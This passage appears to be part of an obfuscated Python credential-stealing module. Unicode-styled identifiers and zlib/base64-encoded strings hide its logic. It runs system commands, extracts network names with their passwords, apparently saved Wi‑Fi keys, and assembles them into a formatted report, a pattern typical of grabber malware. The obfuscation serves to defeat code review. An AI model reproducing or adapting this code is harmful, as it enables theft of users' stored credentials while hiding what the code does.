                    𝘳𝙚𝘴𝘂𝘭𝘁𝘴 = [𝗯.split(__𝗶𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝗶𝙣𝙩.from_bytes(𝘮𝗮𝗽(lambda O, i: 365 - (𝘪𝘯𝘵(𝙊) + 𝗶), 𝙢𝘢𝙥(__𝙞𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝗶𝙩𝗲𝗿(__𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xad\x8a4\x00\x00\x03\x88\x01Q')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝘦(1)), __𝘪𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝘪𝘯𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 451 - (𝗶𝙣𝙩(𝗢) + 𝘪), 𝗺𝙖𝙥(__𝙞𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝙞𝙩𝗲𝘳(__𝙞𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3s\t-\x07\x00\x03)\x01_')).decode())] * 3)), 𝘳𝙖𝙣𝙜𝗲(1)), __𝙞𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝙞𝘯𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 892 - (𝗶𝘯𝙩(𝙊) + 𝙞), 𝗺𝘢𝙥(__𝗶𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝙩𝙚𝙧(__𝘪𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3w\xc9\xae\x00\x00\x03Z\x01w')).decode())] * 3)), 𝙧𝗮𝙣𝗴𝗲(1)), __𝘪𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝗯 in 𝙧𝙚𝙨𝙪𝗹𝘁𝙨 if __𝙞𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x0b6\n3\xf5t\xf5+K\xca\x0b\xcaI\xca\x0b\xb4\x05\x00*\xf3\x05O')).decode() in 𝗯]
                except 𝙨𝙪𝗯𝗽𝗿𝗼𝘤𝙚𝙨𝙨.CalledProcessError:
                    𝘯𝘦𝘵𝙬𝘰𝗿𝙠𝙨.append((𝙣𝘢𝗺𝗲, __𝙞𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
                    continue
                try:
                    𝘯𝘦𝘁𝘄𝘰𝘳𝗸𝘀.append((𝘯𝗮𝗺𝙚, 𝘳𝙚𝘀𝘂𝘭𝘵𝙨[𝗶𝘯𝙩.from_bytes(𝙢𝘢𝘱(lambda O, i: 569 - (𝙞𝘯𝙩(𝗢) + 𝙞), 𝗺𝙖𝙥(__𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝙩𝙚𝙧(__𝗶𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝗻𝘨𝗲(0)), __𝗶𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
                except 𝙄𝙣𝗱𝙚𝘅𝘌𝘳𝙧𝗼𝘳:
                    𝙣𝙚𝘁𝘸𝙤𝗿𝙠𝘀.append((𝘯𝗮𝙢𝙚, __𝘪𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
        except 𝙨𝙪𝗯𝘱𝙧𝘰𝘤𝘦𝘀𝘴.CalledProcessError:
            pass
        except 𝙐𝘯𝙞𝘤𝙤𝘥𝙚𝗗𝘦𝙘𝙤𝙙𝙚𝘌𝘳𝙧𝘰𝗿:
            pass
        𝘰𝙪𝘵 += __𝗶𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(__𝙞𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0b5\xf4\xf3\nr\xb4\xb5\x05\x00\n\x0f\x02,')).decode(), __𝙞𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0buu\x0b\t5L\t\x08\xcd\x0e\xb4\x05\x00\x18\n\x03\xbd')).decode())
        𝗼𝘶𝙩 += __𝘪𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK56\xb4H56\xf0\x06\x00\t\xab\x02\x15')).decode().format(__𝗶𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝘪𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 566 - (𝗶𝗻𝙩(𝘖) + 𝙞), 𝙢𝗮𝗽(__𝗶𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝗶𝘁𝙚𝗿(__𝘪𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0b\t4\x02\x00\x03\x0c\x01&')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝘦(1)), __𝘪𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), __𝘪𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝘪𝘯𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 712 - (𝗶𝙣𝘁(𝘖) + 𝙞), 𝗺𝗮𝗽(__𝙞𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘵𝗲𝗿(__𝗶𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcbJ\xaf\x02\x00\x03\xc2\x01\x9a')).decode())] * 3)), 𝙧𝗮𝘯𝗴𝙚(1)), __𝘪𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        for (𝙣𝘢𝙢𝘦, 𝗽𝙖𝘀𝙨𝘸𝙤𝗿𝘥) in 𝗻𝘦𝘁𝘸𝙤𝘳𝗸𝘀:
            𝘰𝘶𝘵 += __𝙞𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(𝘯𝘢𝙢𝘦, 𝘱𝘢𝘀𝘴𝙬𝙤𝙧𝘥)
        return (__𝙞𝘮𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xcf\xf3+\x8822\xcdHr\xb3\xacJ\xf1\xf0\xcaI\xcaM1Ht\xc9O\x0f3\xcaqO\x0c\xb4\xb5\x05\x00\xb2\xb7\n\xa7')).decode(), __𝘪𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝗼𝘶𝙩), False)